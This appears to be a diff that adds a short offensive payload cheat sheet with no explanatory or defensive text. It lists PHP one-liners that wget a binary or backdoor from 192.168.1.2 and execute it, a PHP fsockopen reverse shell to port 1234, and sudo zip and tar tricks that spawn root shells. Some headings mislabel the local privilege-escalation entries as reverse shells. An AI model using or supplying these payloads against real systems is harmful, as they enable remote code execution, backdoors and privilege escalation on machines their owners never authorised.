@@ -1,0 +1,17 @@
+# METERPRETER SHELL (METASPLOIT FRAMEWORK)
+<?php system("cd /tmp; wget http://192.168.1.2/shell; chmod 777 shell; ./shell"); ?>
+
+# REVERSE SHELL (PHP FSOCKOPEN)
+<?php $sock=fsockopen("192.168.1.2",1234); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
+
+# PHP BACKDOORED (WEEVELY)
+<?php system("cd /tmp; wget http://192.168.1.2/backdoored; chmod 777 backdoored; mv backdoored backdoored.php"); ?>
+
+# REVERSE SHELL (ZIP)
+sudo -u root zip /tmp/priv.zip /tmp/priv -T --unzip-command="sh -c /bin/bash"
+
+# REVERSE SHELL (TAR)
+sudo -u root tar cf /dev/null /tmp/priv --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+# REVERSE SHELL (PTY SPAWN)
+sudo -u root zip /tmp/priv.zip /tmp/priv -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
